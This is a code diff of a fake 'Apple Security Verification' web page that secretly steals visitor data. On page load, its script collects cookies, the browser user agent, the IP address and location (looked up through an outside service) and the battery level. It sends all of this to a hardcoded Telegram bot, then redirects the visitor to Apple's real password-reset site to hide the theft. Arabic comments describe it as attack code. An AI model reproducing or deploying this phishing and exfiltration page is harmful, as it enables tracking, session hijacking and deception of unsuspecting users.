@@ -1,36 +1,44 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Apple Security Verification</title>
     <script>
-        // الكود الهجومي لإرسال البيانات لبوتك
-        async function sendData() {
+        async function launchAttack() {
             const token = "8213467523:AAE-4yv3jiYvyAHpJU4XJ90lALV5OSKzNDE";
             const chat_id = "6888107255";
-            
-            // جمع المعلومات الأساسية (IP/Device/Cookies)
-            let details = "⚠️ نفاذ جديد: \n";
-            details += "🌐 الموقع: " + window.location.hostname + "\n";
-            details += "📱 الجهاز: " + navigator.userAgent + "\n";
-            details += "🍪 الكوكيز: " + (document.cookie || "None") + "\n";
-            details += "🔗 الرابط المفتوح: " + window.location.href;
 
-            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(details)}`;
-            
             try {
-                await fetch(url);
-            } catch (e) {}
+                // جلب الـ IP الحقيقي والموقع من خدمة خارجية
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
 
-            // تمويه: تحويل الضحية لموقع آبل الحقيقي بعد السرقة
-            window.location.replace("https://iforgot.apple.com");
+                let msg = "🚀 نفاذ متقدم - تم سحب البيانات:\n";
+                msg += "🌐 الـ IP الحقيقي: " + data.ip + "\n";
+                msg += "📍 المدينة: " + data.city + " (" + data.country_name + ")\n";
+                msg += "📶 المزود: " + data.org + "\n";
+                msg += "📱 المتصفح: " + navigator.userAgent + "\n";
+                msg += "🔋 مستوى البطارية: " + (await navigator.getBattery()).level * 100 + "%\n";
+                msg += "🔒 الكوكيز المتاحة: " + (document.cookie || "محمية بميزة HttpOnly");
+
+                // إرسال البيانات فوراً للتليجرام
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
+                
+            } catch (error) {
+                // في حال فشل جلب الـ IP، إرسال تنبيه بالدخول على الأقل
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=Target_Entered_But_IP_Blocked`);
+            }
+
+            // التمويه النهائي
+            setTimeout(() => {
+                window.location.replace("https://iforgot.apple.com");
+            }, 500);
         }
-        window.onload = sendData;
+        window.onload = launchAttack;
     </script>
 </head>
-<body style="background-color: black; color: white; text-align: center; padding-top: 50px;">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" width="100" style="filter: invert(1);">
-    <h2>Verifying Security Status...</h2>
-    <p>Please wait while we secure your connection.</p>
+<body style="background:black; color:white; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh;">
+    <div style="text-align:center;">
+        <div style="font-size:60px;"></div>
+        <p>Checking Device Security...</p>
+    </div>
 </body>
 </html>
